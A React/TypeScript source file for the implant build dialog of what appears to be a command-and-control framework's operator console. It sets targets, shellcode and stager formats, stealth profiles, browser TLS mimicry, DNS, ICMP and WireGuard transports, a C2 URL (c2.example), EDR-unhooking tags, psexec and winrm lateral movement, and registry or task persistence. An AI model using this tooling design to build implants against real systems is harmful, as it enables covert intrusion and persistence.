import { useEffect, useState } from 'react'
import { invoke } from '../hooks'

const PROFILES = ['default', 'stealth', 'opsec', 'paranoid']
const FORMATS = ['exe', 'dll', 'elf', 'shellcode', 'stager']

export default function BuildDialog(props: {
  onClose: () => void
  onDone: (msg: string) => void
}): JSX.Element {
  const [f, setF] = useState<Record<string, string>>({
    target_os: 'windows', target_arch: 'amd64', output_format: 'exe',
    transport_mode: 'http', opsec_profile: 'opsec', tls_profile: 'chrome',
    kill_days: '30', url: ''
  })
  const [tags, setTags] = useState('')
  const [jump, setJump] = useState('')
  const [persist, setPersist] = useState('')
  const [wasm, setWasm] = useState(false)
  const [busy, setBusy] = useState(false)
  const [err, setErr] = useState('')
  const [note, setNote] = useState('')
  const [adv, setAdv] = useState<Record<string, string>>({})
  const [mtls, setMtls] = useState(false)
  const [profiles, setProfiles] = useState<Array<{ name: string; description?: string }>>([])

  useEffect(() => {
    void invoke<{ profiles: Array<{ name: string; description?: string }> }>('build.profiles')
      .then((r) => setProfiles(r.profiles)).catch(() => undefined)
  }, [])

  const set = (k: string) => (e: { target: { value: string } }): void =>
    setF({ ...f, [k]: e.target.value })

  const go = async (): Promise<void> => {
    setBusy(true)
    setErr('')
    try {
      const out = await window.t2.pickPath(
        `${f.target_os}-${f.target_arch}.${f.output_format}`)
      if (!out) return
      const cfg: Record<string, unknown> = {
        ...f,
        kill_days: Number(f.kill_days || 30),
        tags, jump_methods: jump, persistence: persist,
        wasm_extensions: wasm
      }
      for (const [k, v] of Object.entries(adv)) {
        if (v.trim()) cfg[k] = v.trim()
      }
      if (mtls) {
        cfg.mtls = {
          enabled: true,
          dir: adv.mtls_dir ?? '',
          cert: adv.mtls_cert ?? '',
          key: adv.mtls_key ?? '',
          ca: adv.mtls_ca ?? ''
        }
      }
      await invoke('build.start', { config: cfg, out })
      props.onDone(`build queued → ${out}`)
    } catch (e) {
      setErr((e as Error).message)
    } finally {
      setBusy(false)
    }
  }

  return (
    <div className="modal" onMouseDown={(e) => e.target === e.currentTarget && props.onClose()}>
      <form className="modal-card" role="dialog" aria-modal="true" aria-label="Build agent"
        onSubmit={(e) => { e.preventDefault(); void go() }}>
        <h2>Build agent</h2>
        <div className="modal-body grid2">
          <label>OS
            <select value={f.target_os} onChange={set('target_os')}>
              {['windows', 'linux'].map((x) => <option key={x}>{x}</option>)}
            </select>
          </label>
          <label>Arch
            <select value={f.target_arch} onChange={set('target_arch')}>
              {['amd64', 'arm64'].map((x) => <option key={x}>{x}</option>)}
            </select>
          </label>
          <label>Format
            <select value={f.output_format} onChange={set('output_format')}>
              {FORMATS.map((x) => <option key={x}>{x}</option>)}
            </select>
          </label>
          <label>OPSEC profile
            <select value={f.opsec_profile} onChange={set('opsec_profile')}>
              {PROFILES.map((x) => <option key={x}>{x}</option>)}
            </select>
          </label>
          <label>Transport
            <select value={f.transport_mode} onChange={set('transport_mode')}>
              {['http', 'quic', 'websocket', 'dns', 'doh', 'icmp', 'wireguard']
                .map((x) => <option key={x}>{x}</option>)}
            </select>
          </label>
          <label>TLS fingerprint
            <select value={f.tls_profile} onChange={set('tls_profile')}>
              {['chrome', 'firefox', 'safari', 'go'].map((x) => <option key={x}>{x}</option>)}
            </select>
          </label>
          <label className="span2">URL
            <input className="field" value={f.url} onChange={set('url')}
              placeholder="https://c2.example" required />
          </label>
          <label>Kill days
            <input className="field" type="number" value={f.kill_days} onChange={set('kill_days')} />
          </label>
          <label>Extra tags
            <input className="field" value={tags} onChange={(e) => setTags(e.target.value)}
              placeholder="ev_unhook, update" />
          </label>
          <label>Jump methods
            <input className="field" value={jump} onChange={(e) => setJump(e.target.value)}
              placeholder="psexec,winrm" />
          </label>
          <label>Persistence
            <input className="field" value={persist} onChange={(e) => setPersist(e.target.value)}
              placeholder="registry,task" />
          </label>
          <label className="check span2">
            <input type="checkbox" checked={wasm} onChange={(e) => setWasm(e.target.checked)} />
            Link the WASM host
          </label>
        </div>
        <details className="advanced">
          <summary>Advanced</summary>
          <div className="modal-body grid2">
            <label>C2 profile
              <select value={adv.c2_profile ?? ''}
                onChange={(e) => setAdv({ ...adv, c2_profile: e.target.value })}>
                <option value="">—</option>
                {profiles.map((p) => (
                  <option key={p.name} value={p.name}>{p.name}</option>
                ))}
              </select>
            </label>
            <label>Identity role
              <input className="field" value={adv.identity_role ?? ''}
                onChange={(e) => setAdv({ ...adv, identity_role: e.target.value })} />
            </label>
            <label>Pivot key path
              <input className="field" value={adv.pivot_key_path ?? ''}
                onChange={(e) => setAdv({ ...adv, pivot_key_path: e.target.value })} />
            </label>
            <label className="check">
              <input type="checkbox" checked={mtls} onChange={(e) => setMtls(e.target.checked)} />
              mTLS bundle
            </label>
            {mtls && (['mtls_dir', 'mtls_cert', 'mtls_key', 'mtls_ca'] as const).map((k) => (
              <label key={k}>{k.replace('_', ' ')}
                <input className="field" value={adv[k] ?? ''}
                  onChange={(e) => setAdv({ ...adv, [k]: e.target.value })} />
              </label>
            ))}
            <label>WireGuard server pubkey
              <input className="field" value={adv.wireguard_server_pubkey ?? ''}
                onChange={(e) => setAdv({ ...adv, wireguard_server_pubkey: e.target.value })} />
            </label>
            <label>WireGuard server addr
              <input className="field" value={adv.wireguard_server_addr ?? ''}
                onChange={(e) => setAdv({ ...adv, wireguard_server_addr: e.target.value })} />
            </label>
            <label>WireGuard agent privkey
              <input className="field" value={adv.wireguard_agent_privkey ?? ''}
                onChange={(e) => setAdv({ ...adv, wireguard_agent_privkey: e.target.value })} />
            </label>
            <label>WireGuard tunnel IP
              <input className="field" value={adv.wireguard_tunnel_ip ?? ''}
                onChange={(e) => setAdv({ ...adv, wireguard_tunnel_ip: e.target.value })} />
            </label>
            <label>TCP relay target
              <input className="field" value={adv.tcp_relay_target ?? ''}
                onChange={(e) => setAdv({ ...adv, tcp_relay_target: e.target.value })} />
            </label>
            <label>TCP relay token
              <input className="field" value={adv.tcp_relay_token ?? ''}
                onChange={(e) => setAdv({ ...adv, tcp_relay_token: e.target.value })} />
            </label>
            <label>TCP reverse listen
              <input className="field" value={adv.tcp_rev_listen ?? ''}
                onChange={(e) => setAdv({ ...adv, tcp_rev_listen: e.target.value })} />
            </label>
            <label>TCP reverse target
              <input className="field" value={adv.tcp_rev_target ?? ''}
                onChange={(e) => setAdv({ ...adv, tcp_rev_target: e.target.value })} />
            </label>
            <label>TCP reverse token
              <input className="field" value={adv.tcp_rev_token ?? ''}
                onChange={(e) => setAdv({ ...adv, tcp_rev_token: e.target.value })} />
            </label>
          </div>
        </details>
        {note && <div className="small okc">{note}</div>}
        {err && <div className="err-line">{err}</div>}
        <div className="modal-foot">
          <button type="button" className="btn" onClick={async () => {
            const path = await window.t2.pickOpen()
            if (!path) return
            try {
              const cfg = (await invoke('build.config.import', { path })) as Record<string, unknown>
              const str: Record<string, string> = {}
              for (const [k, v] of Object.entries(cfg)) {
                if (v === null || typeof v === 'object') continue
                str[k] = String(v)
              }
              setF((old) => ({ ...old, ...str }))
              setAdv((old) => ({ ...old, ...str }))
              if (cfg.mtls) setMtls(true)
              setNote(`loaded ${path.split('/').pop()}`)
            } catch (e) { setErr((e as Error).message) }
          }}>Load config…</button>
          <button type="button" className="btn" onClick={props.onClose}>Cancel</button>
          <button className="btn primary" disabled={busy || !f.url}>
            {busy ? 'starting…' : 'Build'}
          </button>
        </div>
      </form>
    </div>
  )
}
